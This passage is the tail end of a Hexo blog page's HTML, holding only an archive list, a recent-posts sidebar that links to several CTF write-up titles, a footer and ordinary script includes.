class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/10/01/%E7%94%A8github%20action%20%E8%AE%A9hexo%E4%BD%93%E9%AA%8C++/">用github action 让hexo体验++</a>
          </li>
        
          <li>
            <a href="/2021/03/01/%E6%88%91%E7%9A%842020/">我的2020</a>
          </li>
        
          <li>
            <a href="/2021/01/13/real%20world%20ctf%202020/">real world ctf 2020</a>
          </li>
        
          <li>
            <a href="/2020/12/15/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/">2020xnuca_ezwp题解</a>
          </li>
        
          <li>
            <a href="/2020/11/26/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">2020 balsn ctf web 部分题解</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2021 ccreater<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>